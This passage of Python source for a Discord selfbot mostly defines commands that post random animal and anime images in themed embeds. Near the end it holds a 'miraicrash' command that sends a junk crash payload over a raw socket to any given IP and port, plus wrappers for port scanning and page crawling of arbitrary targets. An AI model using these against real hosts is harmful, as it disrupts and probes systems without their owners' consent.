        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="wink", description="Sends a random wink image")
    async def wink(ctx):
        
        request = requests.get('https://some-random-api.ml/animu/wink')
        data = request.json()
        image_url = data['link']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Wink',timestamp=embed_timestamp())
        embed.set_image(url=image_url)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


    
    @React.command(usage="cat", description="Sends a random cat image")
    async def cat(ctx):
        
        request = requests.get('https://some-random-api.ml/img/cat')
        data = request.json()
        image_url = data['link']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Cat',timestamp=embed_timestamp())
        embed.set_image(url=image_url)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="panda", description="Sends a random panda image")
    async def panda(ctx):
        
        request = requests.get('https://some-random-api.ml/img/panda')
        data = request.json()
        image_url = data['link']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Panda',timestamp=embed_timestamp())
        embed.set_image(url=image_url)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="redpanda", description="Sends a random red panda image")
    async def redpanda(ctx):
        
        request = requests.get('https://some-random-api.ml/img/red_panda')
        data = request.json()
        image_url = data['link']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Red Panda',timestamp=embed_timestamp())
        embed.set_image(url=image_url)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="bird", description="Sends a random bird image")
    async def bird(ctx):
        
        request = requests.get('https://reactselfbot.pro/api/generation.php?type=bird')
        data = request.json()
        image_url = data['file']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Bird',timestamp=embed_timestamp())
        embed.set_image(url=image_url)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="bear", description="Generates a bear image")
    async def bear(ctx):
        
        request = requests.get('https://no-api-key.com/api/v1/animals/bear')
        data = request.json()
        image_url = data['image']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Bear',timestamp=embed_timestamp())
        embed.set_image(url=image_url)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="car", description="Generates a car image")
    async def car(ctx):
        
        request = requests.get('https://no-api-key.com/api/v1/car')
        data = request.json()
        image_url = data['image']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Car',timestamp=embed_timestamp())
        embed.set_image(url=image_url)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="shiba", description="Generates a shiba image")
    async def shiba(ctx):
        
        request = requests.get('https://shibe.online/api/shibes')
        data = request.json()
        image_url = data[0]
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Shiba',timestamp=embed_timestamp())
        embed.set_image(url=image_url)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="koala", description="Sends a random koala image")
    async def koala(ctx):
        
        request = requests.get('https://some-random-api.ml/img/koala')
        data = request.json()
        image_url = data['link']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Koala',timestamp=embed_timestamp())
        embed.set_image(url=image_url)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="pikachu", description="Sends a random pikachu image")
    async def pikachu(ctx):
        
        request = requests.get('https://some-random-api.ml/img/pikachu')
        data = request.json()
        image_url = data['link']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Pikachu',timestamp=embed_timestamp())
        embed.set_image(url=image_url)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="triggered <User>", description="Adds triggered overlay to avatar")
    async def triggered(ctx, memberid: discord.User=None):
        
        try:
            if memberid is None:
                member = ctx.author
            else:
                member = memberid
            av = member.avatar_url
            
            triggered_url = requests.get(f'https://reactselfbot.pro/api/generation.php?type=triggered&url={str(av).replace(".webp", ".png")}').json()['url']

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Triggered',timestamp=embed_timestamp())
            embed.set_image(url=triggered_url)
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="wasted <User>", description="Adds wasted overlay to avatar")
    async def wasted(ctx, memberid: discord.User=None):
        
        try:
            if memberid is None:
                member = ctx.author
            else:
                member = memberid
            av = member.avatar_url
            
            wasted_url = requests.get(f'https://reactselfbot.pro/api/generation.php?type=wasted&url={str(av).replace(".webp", ".png")}').json()['url']

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Wasted',timestamp=embed_timestamp())
            embed.set_image(url=wasted_url)
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            return

    @React.command(usage="bottoken", description="Generates a random Discord bottoken")
    async def bottoken(ctx):
        
        request = requests.get('https://some-random-api.ml/bottoken')
        data = request.json()
        token = data['token']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Token', description=token,timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="namehistory <Minecraft Username>", description="Shows the name history of a Minecraft account")
    async def namehistory(ctx, username: str):
        
        request = requests.get(f'https://some-random-api.ml/mc?username={urllib.parse.quote(username)}')
        data = request.json()
        history = data['name_history']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Minecraft Name History',timestamp=embed_timestamp())
        for i in range(len(history)):
            embed.add_field(name=history[i]['name'], value=history[i]['changedToAt'], inline=False)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="hug", description="Sends a random hug gif")
    async def hug(ctx):
        
        request = requests.get(f'https://some-random-api.ml/animu/hug')
        data = request.json()
        image_url = data['link']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Hug',timestamp=embed_timestamp())
        embed.set_image(url=image_url)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="poll <Message>", description="Starts a poll with a specific message")
    async def poll(ctx, *, poll: str):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Poll', description=poll,timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        msg = await ctx.send(embed=embed)
        await msg.add_reaction('üëç')
        await msg.add_reaction('üëé')

    @React.command(usage="suggestion <Message>", description="Sends a suggestion with a specific message")
    async def suggestion(ctx, *, suggestion: str):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Suggestion', description=suggestion,timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        msg = await ctx.send(embed=embed)
        await msg.add_reaction('‚úÖ')
        await msg.add_reaction('‚ùå')

    @React.command(usage="miraicrash <IP Address> <Port>", description="Crashes a Mirai Botnet")
    async def miraicrash(ctx, ip: str, port: int):
        if ip or port is not None:
            
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Mirai Crash', description=f'Crashed Mirai at {ip}:{port}',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$(*¬£&(*&$^*(^¬£*&)((*&)(*&()))))" * 25
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(payload.encode())
            s.close()
        else:
            
            return
        
    @React.command(usage="portscan <IP Address>", description="Scans an IP Address for open ports")
    async def portscan(ctx, ip: str):
        if ip is not None:
            request = requests.get(f'https://api.hackertarget.com/nmap/?q={urllib.parse.quote(ip)}')
            result = request.text.strip(" ( https://nmap.org/ )")
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Port Scanner', description=f'{result}',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            pass

    @React.command(usage="crawl <URL>", description="Crawl a website")
    async def crawl(ctx, website: str):
        if website is not None:
            request = requests.get(f'https://api.hackertarget.com/pagelinks/?q={urllib.parse.quote(website)}')
            result = request.text
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Crawl', description=f'{result}',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            pass
        
    @React.command(usage="showping <IP Address>", description="Shows ping of an IP")
    async def showping(ctx, ip: str):
        if ip is not None:
            request = requests.get(f'https://api.hackertarget.com/nping/?q={urllib.parse.quote(ip)}')
            result = request.text.strip(" ( https://nmap.org/ )")
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Nping', description=f'{result}',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            
            pass
        
    @React.command(usage="httpheaders <IP>", description="Show HTTP headers")
    async def httpheaders(ctx, ip: str):
        if ip is not None:
            request = requests.get(f'https://api.hackertarget.com/httpheaders/?q={urllib.parse.quote(ip)}')
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'HTTP Headers', description=f'{request.text}',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
